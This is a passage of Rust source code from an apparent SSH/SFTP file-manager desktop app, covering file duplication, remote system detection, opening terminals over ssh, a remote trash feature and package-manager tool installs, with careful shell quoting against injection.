) -> String {
    let is_sep = |c: char| c == '/' || (windows_separators && c == '\\');
    let trimmed = if path.len() > 1 {
        path.trim_end_matches(is_sep)
    } else {
        path
    };
    let (parent, name) = match trimmed.rfind(is_sep) {
        Some(i) => (&trimmed[..=i], &trimmed[i + 1..]),
        None => ("", trimmed),
    };
    let (stem, ext) = if is_dir {
        (name, "")
    } else {
        split_name_extension(name)
    };
    let suffix = if n <= 1 {
        "_copy".to_string()
    } else {
        format!("_copy{}", n)
    };
    format!("{parent}{stem}{suffix}{ext}")
}

/// Recursive copy through the VFS (for protocols without a shell: FTP, S3).
async fn copy_tree_vfs(
    vfs: &Arc<dyn VirtualFileSystem>,
    src: &str,
    dst: &str,
) -> Result<(), String> {
    let mut stack = vec![(src.to_string(), dst.to_string())];
    while let Some((from, to)) = stack.pop() {
        vfs.create_dir(&to).await.map_err(core_err)?;
        for entry in vfs.list_dir(&from).await.map_err(core_err)? {
            if entry.name == "." || entry.name == ".." {
                continue;
            }
            let child_src = format!("{}/{}", from.trim_end_matches('/'), entry.name);
            let child_dst = format!("{}/{}", to.trim_end_matches('/'), entry.name);
            if entry.is_dir() {
                stack.push((child_src, child_dst));
            } else {
                stream_copy_file(vfs, &child_src, vfs, &child_dst).await?;
            }
        }
    }
    Ok(())
}

#[tauri::command]
pub async fn duplicate_item(
    state: tauri::State<'_, AppState>,
    session_id: String,
    path: String,
) -> Result<String, String> {
    let vfs = get_vfs(&state, &session_id).await?;

    let meta = vfs.metadata(&path).await.map_err(|e| e.to_string())?;
    let is_dir = meta.is_dir();
    let is_local = vfs.protocol() == Protocol::Local;
    let windows_local = cfg!(target_os = "windows") && is_local;

    // First free name: an existing copy (maybe edited by the user) is never replaced,
    // and `cp -R` never nests the source inside an existing folder.
    let mut new_path = None;
    for n in 1..=1000u32 {
        let candidate = duplicate_candidate(&path, is_dir, n, windows_local);
        if !vfs.exists(&candidate).await.unwrap_or(false) {
            new_path = Some(candidate);
            break;
        }
    }
    let new_path = new_path.ok_or_else(|| "Could not find a free name for the copy".to_string())?;

    if is_dir {
        let source = if path.len() > 1 {
            path.trim_end_matches('/').to_string()
        } else {
            path.clone()
        };
        if is_local {
            let (src, dst) = (source.clone(), new_path.clone());
            tokio::task::spawn_blocking(move || {
                copy_dir_recursive(std::path::Path::new(&src), std::path::Path::new(&dst))
            })
            .await
            .map_err(|e| e.to_string())?
            .map_err(|e| format!("Duplicate failed: {}", e))?;
        } else if posix_shell_available(&vfs).await {
            // Server-side copy: big trees may take longer than ordinary commands may run.
            let cmd = format!("cp -R -- {} {}", sh_quote(&source), sh_quote(&new_path));
            let (code, stdout, stderr) = execute_long_command(&vfs, &cmd)
                .await
                .map_err(|e| format!("Duplicate failed: {e}"))?;
            if code != 0 {
                return Err(format!(
                    "Duplicate failed: {}",
                    command_failure_detail(code, &stdout, &stderr)
                ));
            }
        } else {
            copy_tree_vfs(&vfs, &source, &new_path)
                .await
                .map_err(|e| format!("Duplicate failed: {}", e))?;
        }
    } else {
        stream_copy_file(&vfs, &path, &vfs, &new_path)
            .await
            .map_err(|e| format!("Duplicate failed: {}", e))?;
    }

    state
        .disk_cache
        .invalidate_catalog(&session_id, &path)
        .await;
    state
        .disk_cache
        .invalidate_catalog(&session_id, &new_path)
        .await;

    Ok(new_path)
}

// ---------------------- REMOTE OS & TERMINAL COMMANDS ----------------------

/// Probe run through the session's own shell (no new SSH connection).
const SYSTEM_PROBE_SCRIPT: &str = r#"
echo "---OS---"
if [ -f /etc/os-release ]; then
    cat /etc/os-release
elif [ -f /etc/redhat-release ]; then
    echo "PRETTY_NAME=\"$(cat /etc/redhat-release)\""
    echo "ID=rhel"
elif [ -f /etc/alpine-release ]; then
    echo "PRETTY_NAME=\"Alpine Linux $(cat /etc/alpine-release)\""
    echo "ID=alpine"
elif [ "$(uname -s 2>/dev/null)" = "Darwin" ]; then
    echo "PRETTY_NAME=\"macOS $(sw_vers -productVersion 2>/dev/null)\""
    echo "ID=macos"
else
    echo "PRETTY_NAME=\"$(uname -s)\""
    echo "ID=unknown"
fi
echo "---UNAME---"
uname -srm 2>/dev/null || uname -a
echo "---SHELL---"
echo "$SHELL"
echo "---PKG---"
for p in apt-get apk dnf yum pacman zypper brew; do
    if command -v "$p" >/dev/null 2>&1; then
        echo "$p"
        break
    fi
done
echo "---WHO---"
id -u 2>/dev/null
hostname 2>/dev/null || uname -n
echo "---SUDO---"
if [ "$(id -u 2>/dev/null)" = "0" ]; then echo yes; elif sudo -n true 2>/dev/null; then echo yes; else echo no; fi
"#;

/// Parses the output of [`SYSTEM_PROBE_SCRIPT`].
pub(crate) fn parse_system_probe(stdout: &str) -> RemoteSystemInfo {
    let mut os_name = "Linux".to_string();
    let mut distro_id = "linux".to_string();
    let mut kernel = "Linux".to_string();
    let mut default_shell = "/bin/sh".to_string();
    let mut package_manager = "unknown".to_string();
    let mut is_root = false;
    let mut has_sudo = false;
    let mut hostname = String::new();
    let mut architecture = String::new();

    let mut section = "";
    for line in stdout.lines() {
        let line = line.trim();
        if line.starts_with("---") && line.ends_with("---") && line.len() > 6 {
            section = line;
            continue;
        }
        if line.is_empty() {
            continue;
        }
        match section {
            "---OS---" => {
                if let Some(val) = line.strip_prefix("PRETTY_NAME=") {
                    os_name = val.trim_matches('"').trim_matches('\'').to_string();
                } else if let Some(val) = line.strip_prefix("ID=") {
                    distro_id = val.trim_matches('"').trim_matches('\'').to_string();
                }
            }
            "---UNAME---" => {
                kernel = line.to_string();
                if let Some(last) = line.split_whitespace().last() {
                    architecture = last.to_string();
                }
            }
            "---SHELL---" => default_shell = line.to_string(),
            "---PKG---" => package_manager = line.to_string(),
            "---WHO---" => {
                if line.chars().all(|c| c.is_ascii_digit()) {
                    is_root = line == "0";
                } else if hostname.is_empty() {
                    hostname = line.to_string();
                }
            }
            "---SUDO---" => has_sudo = line == "yes",
            _ => {}
        }
    }

    if distro_id == "unknown" || distro_id == "linux" {
        let lower = os_name.to_lowercase();
        for (needle, id) in [
            ("ubuntu", "ubuntu"),
            ("debian", "debian"),
            ("alpine", "alpine"),
            ("centos", "centos"),
            ("fedora", "fedora"),
            ("red hat", "rhel"),
            ("rhel", "rhel"),
            ("arch", "arch"),
        ] {
            if lower.contains(needle) {
                distro_id = id.to_string();
                break;
            }
        }
    }
    if package_manager == "unknown" || package_manager.is_empty() {
        package_manager = match distro_id.as_str() {
            "ubuntu" | "debian" => "apt",
            "alpine" => "apk",
            "fedora" | "rhel" | "centos" | "rocky" | "alma" => "dnf",
            "arch" => "pacman",
            _ => "unknown",
        }
        .to_string();
    }

    RemoteSystemInfo {
        os_name,
        distro_id,
        kernel,
        default_shell,
        package_manager,
        is_root,
        has_sudo: is_root || has_sudo,
        hostname: if hostname.is_empty() {
            "remote-server".to_string()
        } else {
            hostname
        },
        architecture: if architecture.is_empty() {
            "unknown".to_string()
        } else {
            architecture
        },
    }
}

#[tauri::command]
pub async fn detect_remote_system(
    state: tauri::State<'_, AppState>,
    session_id: String,
) -> Result<RemoteSystemInfo, String> {
    let vfs = get_vfs(&state, &session_id).await?;

    match vfs.protocol() {
        // Windows has no POSIX shell for the probe: describe this machine directly.
        Protocol::Local if cfg!(target_os = "windows") => {
            let os = std::env::consts::OS.to_string();
            let arch = std::env::consts::ARCH.to_string();
            Ok(RemoteSystemInfo {
                os_name: format!("{} ({})", os, arch),
                distro_id: os,
                kernel: std::env::consts::FAMILY.to_string(),
                default_shell: std::env::var("COMSPEC").unwrap_or_else(|_| "cmd.exe".to_string()),
                package_manager: "winget".to_string(),
                is_root: false,
                has_sudo: false,
                hostname: std::env::var("COMPUTERNAME").unwrap_or_else(|_| "localhost".to_string()),
                architecture: arch,
            })
        }
        // The live session's own shell (SSH, or /bin/sh locally): no second connection.
        Protocol::Local | Protocol::Sftp if vfs.supports_shell() => {
            let (_, stdout, stderr) = vfs
                .execute_command(SYSTEM_PROBE_SCRIPT)
                .await
                .map_err(command_error_message)?;
            if !stdout.contains("---OS---") {
                return Err(format!(
                    "Could not inspect the system: {}",
                    if stderr.trim().is_empty() {
                        "no output from the server shell"
                    } else {
                        stderr.trim()
                    }
                ));
            }
            Ok(parse_system_probe(&stdout))
        }
        other => Err(format!(
            "System detection needs a shell; {:?} sessions do not provide one",
            other
        )),
    }
}

/// Remote command run by `ssh -t`: `cd` into `path` (falling back to the home directory)
/// and start the user's login shell. The path is quoted for the remote POSIX shell.
pub(crate) fn remote_terminal_command(path: &str) -> String {
    let p = path.trim();
    let cd = if p.is_empty() || p == "~" {
        "cd".to_string()
    } else if let Some(rest) = p.strip_prefix("~/") {
        format!("cd ~/{}", sh_quote(rest))
    } else {
        format!("cd {}", sh_quote(&safe_operand(p)))
    };
    format!("{cd} 2>/dev/null || cd; exec \"$SHELL\" -l")
}

fn validate_ssh_destination(host: &str, username: &str) -> Result<(), String> {
    let host_ok = !host.is_empty()
        && !host.starts_with('-')
        && host
            .chars()
            .all(|c| c.is_alphanumeric() || matches!(c, '.' | '-' | '_' | ':' | '%'));
    if !host_ok {
        return Err(format!("Invalid SSH host '{}'", host.escape_default()));
    }
    if username.starts_with('-')
        || username
            .chars()
            .any(|c| c.is_whitespace() || c.is_control())
    {
        return Err(format!(
            "Invalid SSH username '{}'",
            username.escape_default()
        ));
    }
    Ok(())
}

/// `ssh` arguments that open an interactive shell in `remote_path` on the session's
/// server. They are always passed as an argument vector (or quoted one by one with
/// [`sh_quote`]); `--` ends ssh's own options so the destination can never be one.
pub(crate) fn ssh_terminal_args(
    cfg: &ConnectionConfig,
    remote_path: &str,
) -> Result<Vec<String>, String> {
    let raw_host = cfg.host.trim();
    let host = raw_host
        .strip_prefix('[')
        .and_then(|h| h.strip_suffix(']'))
        .unwrap_or(raw_host);
    let user = cfg.username.trim();
    validate_ssh_destination(host, user)?;

    let port = if cfg.port == 0 { 22 } else { cfg.port };
    let mut args = vec!["-p".to_string(), port.to_string()];
    if let rustscp_core::AuthMethod::PrivateKey { path, .. } = &cfg.auth {
        let key = path.trim();
        if !key.is_empty() {
            if has_control_chars(key) {
                return Err("Invalid private key path".to_string());
            }
            args.push("-i".to_string());
            args.push(key.to_string());
        }
    }
    args.push("-t".to_string());
    args.push("--".to_string());
    args.push(if user.is_empty() {
        host.to_string()
    } else {
        format!("{user}@{host}")
    });
    args.push(remote_terminal_command(remote_path));
    Ok(args)
}

/// Writes a private (0600), self-deleting `/bin/sh` script that runs `ssh <args>`.
/// Terminal.app then only types `/bin/sh '<script>'` into the user's shell, so remote
/// data is never parsed by that shell (which may be zsh, bash or fish).
#[cfg_attr(not(target_os = "macos"), allow(dead_code))]
fn write_ssh_launcher_script(ssh_args: &[String]) -> Result<std::path::PathBuf, String> {
    use std::io::Write;

    let mut dir = std::env::temp_dir();
    let dir_is_plain = dir
        .to_string_lossy()
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '/' | '.' | '_' | '-'));
    if !dir_is_plain {
        dir = std::path::PathBuf::from("/tmp");
    }
    let path = dir.join(format!("rustscp-ssh-{}.sh", uuid::Uuid::new_v4().simple()));
    let script = format!("#!/bin/sh\nrm -f -- \"$0\"\nssh {}\n", sh_join(ssh_args));

    let mut options = std::fs::OpenOptions::new();
    options.write(true).create_new(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        options.mode(0o600);
    }
    let mut file = options
        .open(&path)
        .map_err(|e| format!("Could not create the terminal launcher: {e}"))?;
    if let Err(e) = file.write_all(script.as_bytes()) {
        let _ = std::fs::remove_file(&path);
        return Err(format!("Could not write the terminal launcher: {e}"));
    }
    Ok(path)
}

/// AppleScript that opens a Terminal window running its first argument. The command is
/// passed through `argv`, so no value is ever spliced into AppleScript source.
#[cfg_attr(not(target_os = "macos"), allow(dead_code))]
const TERMINAL_DO_SCRIPT: &str = "on run argv\n\
    tell application \"Terminal\"\n\
        activate\n\
        do script (item 1 of argv)\n\
    end tell\n\
end run";

/// Arguments that make a Linux terminal emulator run `program args...` directly (no shell).
#[cfg_attr(any(target_os = "macos", target_os = "windows"), allow(dead_code))]
fn linux_terminal_exec_args(terminal: &str, program: &str, args: &[String]) -> Vec<String> {
    let mut out = Vec::with_capacity(args.len() + 2);
    match terminal {
        "gnome-terminal" => out.push("--".to_string()),
        "kitty" => {}
        "xfce4-terminal" => out.push("-x".to_string()),
        // x-terminal-emulator, konsole, alacritty and xterm take the command after -e.
        _ => out.push("-e".to_string()),
    }
    out.push(program.to_string());
    out.extend(args.iter().cloned());
    out
}

// Each platform block ends in `return`; on the platform that is compiled last that return
// is the tail expression, which clippy would otherwise flag.
#[allow(clippy::needless_return)]
#[tauri::command]
pub async fn open_native_terminal(
    state: tauri::State<'_, AppState>,
    session_id: String,
    path: String,
) -> Result<String, String> {
    let vfs = get_vfs(&state, &session_id).await?;

    if has_control_chars(&path) {
        return Err(
            "Cannot open a terminal in a folder whose name contains control characters".to_string(),
        );
    }
    let is_remote = vfs.protocol() == Protocol::Sftp;

    if !is_remote {
        let local_dir = expand_local_home(&path);

        #[cfg(target_os = "macos")]
        {
            tokio::process::Command::new("open")
                .arg("-a")
                .arg("Terminal")
                .arg(safe_operand(&local_dir))
                .spawn()
                .map_err(|e| e.to_string())?;
            return Ok("Opened macOS Terminal.app".to_string());
        }

        #[cfg(target_os = "windows")]
        {
            const CREATE_NEW_CONSOLE: u32 = 0x0000_0010;
            // The folder is the process working directory, never part of a command line
            // (wt.exe splits its arguments on ';' and cmd.exe interprets '&', '|', '^'...).
            tokio::process::Command::new("wt.exe")
                .args(["-d", "."])
                .current_dir(&local_dir)
                .spawn()
                .or_else(|_| {
                    tokio::process::Command::new("cmd.exe")
                        .current_dir(&local_dir)
                        .creation_flags(CREATE_NEW_CONSOLE)
                        .spawn()
                })
                .map_err(|e| e.to_string())?;
            return Ok("Opened Windows Terminal".to_string());
        }

        #[cfg(not(any(target_os = "macos", target_os = "windows")))]
        {
            for term in &[
                "x-terminal-emulator",
                "gnome-terminal",
                "konsole",
                "alacritty",
                "kitty",
                "xfce4-terminal",
            ] {
                if tokio::process::Command::new(term)
                    .arg(format!("--working-directory={}", local_dir))
                    .spawn()
                    .is_ok()
                {
                    return Ok(format!("Opened {}", term));
                }
            }
            return Err("No supported terminal emulator found".to_string());
        }
    }

    // Remote SSH session: build ssh's argument vector once; each platform passes it on
    // without a local shell string.
    let mut ssh_args = {
        let configs = state.session_configs.read().await;
        let cfg = configs
            .get(&session_id)
            .ok_or_else(|| format!("Session config for '{}' not found", session_id))?;
        ssh_terminal_args(cfg, &path)?
    };
    // The `cd '<path>'` command is parsed by the server's login shell. When that shell
    // does not quote like `sh` (fish, cmd.exe, PowerShell), open a plain login shell in
    // the home folder instead of letting it parse the folder name.
    if !posix_shell_available(&vfs).await {
        ssh_args.pop();
    }

    #[cfg(target_os = "macos")]
    {
        let launcher = write_ssh_launcher_script(&ssh_args)?;
        let typed_command = format!("/bin/sh {}", sh_quote(&launcher.to_string_lossy()));
        let output = tokio::process::Command::new("osascript")
            .arg("-e")
            .arg(TERMINAL_DO_SCRIPT)
            .arg(&typed_command)
            .output()
            .await;
        return match output {
            Ok(out) if out.status.success() => Ok("Opened SSH in macOS Terminal.app".to_string()),
            Ok(out) => {
                let _ = std::fs::remove_file(&launcher);
                Err(format!(
                    "Could not open Terminal.app: {}",
                    String::from_utf8_lossy(&out.stderr).trim()
                ))
            }
            Err(e) => {
                let _ = std::fs::remove_file(&launcher);
                Err(e.to_string())
            }
        };
    }

    #[cfg(target_os = "windows")]
    {
        const CREATE_NEW_CONSOLE: u32 = 0x0000_0010;
        // ssh.exe gets a real argument vector in its own console window; neither cmd.exe
        // nor wt.exe re-parses the remote path, user or key path.
        tokio::process::Command::new("ssh.exe")
            .args(&ssh_args)
            .creation_flags(CREATE_NEW_CONSOLE)
            .spawn()
            .map_err(|e| {
                format!(
                    "Could not start ssh.exe (is the Windows OpenSSH client installed?): {}",
                    e
                )
            })?;
        return Ok("Opened SSH in a new console window".to_string());
    }

    #[cfg(not(any(target_os = "macos", target_os = "windows")))]
    {
        for term in &[
            "x-terminal-emulator",
            "gnome-terminal",
            "konsole",
            "alacritty",
            "kitty",
            "xfce4-terminal",
            "xterm",
        ] {
            if tokio::process::Command::new(term)
                .args(linux_terminal_exec_args(term, "ssh", &ssh_args))
                .spawn()
                .is_ok()
            {
                return Ok(format!("Opened SSH in {}", term));
            }
        }
        return Err("No supported terminal emulator found".to_string());
    }
}

// ---------------------- REMOTE TRASH MANAGEMENT ----------------------

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RemoteTrashResponse {
    pub status: RemoteTrashStatus,
    pub items: Vec<RemoteTrashItem>,
    pub message: String,
}

/// File name part of a path being moved to the trash (trailing `/` ignored).
fn trash_item_basename(path: &str) -> &str {
    let trimmed = if path.len() > 1 {
        path.trim_end_matches('/')
    } else {
        path
    };
    trimmed.rsplit('/').next().unwrap_or(trimmed)
}

/// POSIX shell script that moves `path` into `~/.local/share/Trash` and writes its
/// `.trashinfo`. Every value is a quoted argument (`printf '%s'`), never heredoc text, so
/// a crafted file name cannot end the info file early or inject commands. Paths with
/// control characters (e.g. newlines) cannot be recorded in a `.trashinfo` line and are
/// rejected.
fn build_move_to_trash_script(path: &str) -> Result<String, String> {
    let clean = if path.len() > 1 {
        path.trim_end_matches('/')
    } else {
        path
    };
    if clean.is_empty() || clean == "/" {
        return Err("Refusing to move the root directory to the trash".to_string());
    }
    if has_control_chars(clean) {
        return Err(format!(
            "'{}' contains control characters and cannot be moved to the trash; delete it permanently instead",
            clean.escape_default()
        ));
    }
    let filename = trash_item_basename(clean);
    let timestamp = chrono::Utc::now()
        .timestamp_nanos_opt()
        .unwrap_or_else(|| chrono::Utc::now().timestamp() * 1_000_000_000);
    let trash_name = sh_quote(&format!("{}_{}", timestamp, filename));
    let now_iso = chrono::Utc::now().to_rfc3339();
    Ok(format!(
        "mkdir -p ~/.local/share/Trash/files ~/.local/share/Trash/info 2>/dev/null\n\
         mv -- {src} ~/.local/share/Trash/files/{trash_name} && \
         printf '[Trash Info]\\nPath=%s\\nDeletionDate=%s\\n' {orig} {date} > ~/.local/share/Trash/info/{trash_name}.trashinfo && \
         echo OK\n",
        src = sh_quote(clean),
        orig = sh_quote(clean),
        date = sh_quote(&now_iso),
    ))
}

/// POSIX shell script that moves trash item `item_id` back to the path recorded in its
/// `.trashinfo`. When something new exists at that path, both are kept: the restored
/// item gets a ` (restored N)` suffix. Prints `RESTORED:<final path>`.
fn build_restore_from_trash_script(item_id: &str) -> String {
    let quoted_id = sh_quote(item_id);
    format!(
        r#"
info_file=~/.local/share/Trash/info/{quoted_id}.trashinfo
trash_file=~/.local/share/Trash/files/{quoted_id}
if [ ! -f "$info_file" ] || [ ! -e "$trash_file" ]; then
    echo "Item not found" >&2
    exit 1
fi
orig=$(grep '^Path=' "$info_file" | head -n 1 | cut -d= -f2-)
if [ -z "$orig" ]; then
    echo "Original path missing in trash info" >&2
    exit 1
fi
orig_dir=$(dirname -- "$orig")
mkdir -p -- "$orig_dir" 2>/dev/null
dest="$orig"
if [ -e "$dest" ] || [ -L "$dest" ]; then
    # Something new lives at the original path: keep both instead of replacing it.
    base=$(basename -- "$orig")
    stem="$base"
    ext=""
    if [ ! -d "$trash_file" ]; then
        case "$base" in
            ?*.*) stem="${{base%.*}}"; ext=".${{base##*.}}" ;;
        esac
    fi
    n=1
    while :; do
        dest="$orig_dir/$stem (restored $n)$ext"
        if [ ! -e "$dest" ] && [ ! -L "$dest" ]; then break; fi
        n=$((n + 1))
    done
fi
mv -- "$trash_file" "$dest" || exit 1
rm -f -- "$info_file"
echo "RESTORED:$dest"
"#
    )
}

#[tauri::command]
pub async fn manage_remote_trash(
    state: tauri::State<'_, AppState>,
    session_id: String,
    action: String,
    target_path: Option<String>,
    payload: Option<String>,
) -> Result<RemoteTrashResponse, String> {
    let vfs = get_vfs(&state, &session_id).await?;

    // The trash scripts are POSIX shell. A local session on Windows would run them through
    // cmd.exe, where single quotes do not quote anything.
    if cfg!(target_os = "windows") && vfs.protocol() == Protocol::Local {
        return Err("The remote trash is only available for SSH/SFTP sessions".to_string());
    }
    // The same goes for a server whose login shell is fish, cmd.exe or PowerShell: a
    // crafted file name could run commands there.
    if !posix_shell_available(&vfs).await {
        return Err(posix_shell_required("The remote trash"));
    }

    let default_trash_dir = "~/.local/share/Trash";

    match action.as_str() {
        "setup" => {
            let script = r#"
mkdir -p ~/.local/share/Trash/files ~/.local/share/Trash/info 2>/dev/null
chmod 700 ~/.local/share/Trash ~/.local/share/Trash/files ~/.local/share/Trash/info 2>/dev/null
echo "READY"
"#;
            let (code, _, stderr) = vfs
                .execute_command(script)
                .await
                .map_err(|e| e.to_string())?;
            if code != 0 {
                return Err(format!("Setup failed: {}", stderr));
            }
            Ok(RemoteTrashResponse {
                status: RemoteTrashStatus {
                    enabled: true,
                    initialized: true,
                    trash_dir: default_trash_dir.to_string(),
                    item_count: 0,
                    total_size_bytes: 0,
                },
                items: Vec::new(),
                message: "Lixeira remota criada com sucesso em ~/.local/share/Trash".to_string(),
            })
        }
        "move_to_trash" => {
            let paths_to_trash: Vec<String> = if let Some(pl) = payload {
                if pl.trim_start().starts_with('[') {
                    serde_json::from_str(&pl).unwrap_or_else(|_| vec![pl])
                } else {
                    vec![pl]
                }
            } else if let Some(tp) = target_path {
                if tp.trim_start().starts_with('[') {
                    serde_json::from_str(&tp).unwrap_or_else(|_| vec![tp])
                } else {
                    vec![tp]
                }
            } else {
                return Err("Target path or payload required for move_to_trash".to_string());
            };

            for path in &paths_to_trash {
                let script = build_move_to_trash_script(path)?;
                let filename = trash_item_basename(path).to_string();

                let (code, _, stderr) = vfs
                    .execute_command(&script)
                    .await
                    .map_err(|e| e.to_string())?;
                if code != 0 {
                    return Err(format!(
                        "Falha ao mover '{}' para lixeira: {}",
                        filename, stderr
                    ));
                }

                state.disk_cache.invalidate_catalog(&session_id, path).await;
            }

            Ok(RemoteTrashResponse {
                status: RemoteTrashStatus {
                    enabled: true,
                    initialized: true,
                    trash_dir: default_trash_dir.to_string(),
                    item_count: paths_to_trash.len(),
                    total_size_bytes: 0,
                },
                items: Vec::new(),
                message: format!(
                    "{} item(ns) movido(s) para a lixeira remota",
                    paths_to_trash.len()
                ),
            })
        }
        "list" | "status" => {
            let script = r#"
if [ ! -d ~/.local/share/Trash/files ]; then
    echo "NOT_INITIALIZED"
    exit 0
fi
echo "---COUNT---"
ls -1 ~/.local/share/Trash/files 2>/dev/null | wc -l
echo "---SIZE---"
du -sb ~/.local/share/Trash/files 2>/dev/null | cut -f1 || echo 0
echo "---FILES---"
for info in ~/.local/share/Trash/info/*.trashinfo; do
    if [ -f "$info" ]; then
        base=$(basename "$info" .trashinfo)
        orig=$(grep '^Path=' "$info" | cut -d= -f2-)
        date=$(grep '^DeletionDate=' "$info" | cut -d= -f2-)
        filesize=$(stat -c%s ~/.local/share/Trash/files/"$base" 2>/dev/null || stat -f%z ~/.local/share/Trash/files/"$base" 2>/dev/null || echo 0)
        is_dir=0
        if [ -d ~/.local/share/Trash/files/"$base" ]; then is_dir=1; fi
        echo "$base|$orig|$date|$filesize|$is_dir"
    fi
done
"#;
            let (_, stdout, _) = vfs
                .execute_command(script)
                .await
                .map_err(|e| e.to_string())?;
            if stdout.contains("NOT_INITIALIZED") {
                return Ok(RemoteTrashResponse {
                    status: RemoteTrashStatus {
                        enabled: false,
                        initialized: false,
                        trash_dir: default_trash_dir.to_string(),
                        item_count: 0,
                        total_size_bytes: 0,
                    },
                    items: Vec::new(),
                    message: "Lixeira ainda não inicializada no servidor".to_string(),
                });
            }

            let mut count: usize = 0;
            let mut total_size: u64 = 0;
            let mut items = Vec::new();
            let mut section = "";

            for line in stdout.lines() {
                let line = line.trim();
                if line.starts_with("---") && line.ends_with("---") {
                    section = line;
                    continue;
                }
                match section {
                    "---COUNT---" => {
                        count = line.parse().unwrap_or(0);
                    }
                    "---SIZE---" => {
                        total_size = line.parse().unwrap_or(0);
                    }
                    "---FILES---" => {
                        let parts: Vec<&str> = line.split('|').collect();
                        if parts.len() >= 5 {
                            items.push(RemoteTrashItem {
                                id: parts[0].to_string(),
                                filename: parts[0].to_string(),
                                trash_path: format!("~/.local/share/Trash/files/{}", parts[0]),
                                original_path: parts[1].to_string(),
                                deletion_date: parts[2].to_string(),
                                size: parts[3].parse().unwrap_or(0),
                                is_dir: parts[4] == "1",
                            });
                        }
                    }
                    _ => {}
                }
            }

            Ok(RemoteTrashResponse {
                status: RemoteTrashStatus {
                    enabled: true,
                    initialized: true,
                    trash_dir: default_trash_dir.to_string(),
                    item_count: count,
                    total_size_bytes: total_size,
                },
                items,
                message: "Status da lixeira obtido".to_string(),
            })
        }
        "restore" => {
            let item_id = target_path
                .or(payload)
                .ok_or_else(|| "Item id required for restore".to_string())?;
            // Trash ids are plain file names inside ~/.local/share/Trash/files.
            if item_id.is_empty()
                || item_id == "."
                || item_id == ".."
                || item_id.contains('/')
                || has_control_chars(&item_id)
            {
                return Err(format!(
                    "Invalid trash item id '{}'",
                    item_id.escape_default()
                ));
            }
            let script = build_restore_from_trash_script(&item_id);
            let (code, stdout, stderr) = vfs
                .execute_command(&script)
                .await
                .map_err(|e| e.to_string())?;
            if code != 0 {
                return Err(format!("Restore failed: {}", stderr));
            }
            let mut restored_to = None;
            for line in stdout.lines() {
                if let Some(restored_path) = line.strip_prefix("RESTORED:") {
                    let restored_path = restored_path.trim().to_string();
                    state
                        .disk_cache
                        .invalidate_catalog(&session_id, &restored_path)
                        .await;
                    restored_to = Some(restored_path);
                }
            }
            state
                .disk_cache
                .invalidate_catalog(&session_id, "~/.local/share/Trash/files")
                .await;
            Ok(RemoteTrashResponse {
                status: RemoteTrashStatus {
                    enabled: true,
                    initialized: true,
                    trash_dir: default_trash_dir.to_string(),
                    item_count: 0,
                    total_size_bytes: 0,
                },
                items: Vec::new(),
                message: match restored_to {
                    Some(path) => format!("Item restaurado em {}", path),
                    None => "Item restaurado com sucesso para a localização original".to_string(),
                },
            })
        }
        "empty" => {
            let script = r#"
rm -rf ~/.local/share/Trash/files/* ~/.local/share/Trash/info/* 2>/dev/null
echo "EMPTIED"
"#;
            let (code, _, stderr) = vfs
                .execute_command(script)
                .await
                .map_err(|e| e.to_string())?;
            if code != 0 {
                return Err(format!("Empty trash failed: {}", stderr));
            }
            state
                .disk_cache
                .invalidate_catalog(&session_id, "~/.local/share/Trash/files")
                .await;
            Ok(RemoteTrashResponse {
                status: RemoteTrashStatus {
                    enabled: true,
                    initialized: true,
                    trash_dir: default_trash_dir.to_string(),
                    item_count: 0,
                    total_size_bytes: 0,
                },
                items: Vec::new(),
                message: "Lixeira remota esvaziada permanentemente".to_string(),
            })
        }
        other => Err(format!("Unknown trash action '{}'", other)),
    }
}

// ---------------------- SYSADMIN MARKETPLACE & TOOLS ----------------------

#[tauri::command]
pub async fn install_marketplace_tool(
    state: tauri::State<'_, AppState>,
    session_id: String,
    tool_id: String,
) -> Result<CommandExecutionResult, String> {
    let vfs = get_vfs(&state, &session_id).await?;

    let install_cmd = match tool_id.as_str() {
        "ncdu" => "if command -v apt-get >/dev/null 2>&1; then sudo -n apt-get update && sudo -n apt-get install -y ncdu || apt-get install -y ncdu; elif command -v apk >/dev/null 2>&1; then apk add ncdu; elif command -v dnf >/dev/null 2>&1; then dnf install -y ncdu; elif command -v pacman >/dev/null 2>&1; then pacman -S --noconfirm ncdu; else echo 'No package manager found' >&2; exit 1; fi",
        // Package managers or cargo only: no unverified `curl | tar` download, and a failure
        // exits non-zero so the UI never reports success for an install that did not happen.
        "dust" => "if command -v pacman >/dev/null 2>&1; then sudo -n pacman -S --noconfirm dust || pacman -S --noconfirm dust; elif command -v apk >/dev/null 2>&1; then apk add dust; elif command -v apt-get >/dev/null 2>&1 && apt-cache show du-dust >/dev/null 2>&1; then sudo -n apt-get install -y du-dust || apt-get install -y du-dust; elif command -v dnf >/dev/null 2>&1 && dnf -q info du-dust >/dev/null 2>&1; then sudo -n dnf install -y du-dust || dnf install -y du-dust; elif command -v brew >/dev/null 2>&1; then brew install dust; elif command -v cargo >/dev/null 2>&1; then cargo install --locked du-dust; else echo 'dust is not available from this server package manager; install Rust (cargo) and run: cargo install du-dust' >&2; exit 1; fi",
        "ripgrep" => "if command -v apt-get >/dev/null 2>&1; then sudo -n apt-get install -y ripgrep || apt-get install -y ripgrep; elif command -v apk >/dev/null 2>&1; then apk add ripgrep; elif command -v dnf >/dev/null 2>&1; then dnf install -y ripgrep; elif command -v pacman >/dev/null 2>&1; then pacman -S --noconfirm ripgrep; else echo 'Ripgrep install failed' >&2; exit 1; fi",
        "fd" => "if command -v apt-get >/dev/null 2>&1; then sudo -n apt-get install -y fd-find || apt-get install -y fd-find; elif command -v apk >/dev/null 2>&1; then apk add fd; elif command -v dnf >/dev/null 2>&1; then dnf install -y fd-find; elif command -v pacman >/dev/null 2>&1; then pacman -S --noconfirm fd; else echo 'Fd install failed' >&2; exit 1; fi",
        "zip" => "if command -v apt-get >/dev/null 2>&1; then sudo -n apt-get install -y zip unzip || apt-get install -y zip unzip; elif command -v apk >/dev/null 2>&1; then apk add zip unzip; elif command -v dnf >/dev/null 2>&1; then dnf install -y zip unzip; elif command -v pacman >/dev/null 2>&1; then pacman -S --noconfirm zip unzip; else echo 'Zip install failed' >&2; exit 1; fi",
        "pigz" => "if command -v apt-get >/dev/null 2>&1; then sudo -n apt-get install -y pigz || apt-get install -y pigz; elif command -v apk >/dev/null 2>&1; then apk add pigz; elif command -v dnf >/dev/null 2>&1; then dnf install -y pigz; else echo 'Pigz install failed' >&2; exit 1; fi",
